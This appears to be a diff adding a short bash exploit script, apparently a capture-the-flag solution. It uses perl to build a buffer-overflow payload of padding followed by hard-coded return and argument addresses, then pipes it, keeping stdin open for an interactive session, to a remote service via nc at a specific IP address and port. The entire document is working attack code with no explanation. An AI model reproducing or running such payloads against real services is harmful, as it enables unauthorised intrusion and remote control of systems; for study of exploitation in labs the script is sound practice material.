@@ -1,0 +1,2 @@
+#!/bin/bash
+perl -e 'printf " "x9 . "1". "\n" . "A"x44 . "\xf0\x86\x04\x08" . "A"x4 . "\xa0\xb0\x04\x08" . "\n"' > tmp ; cat tmp - |  nc 140.113.194.85 49169
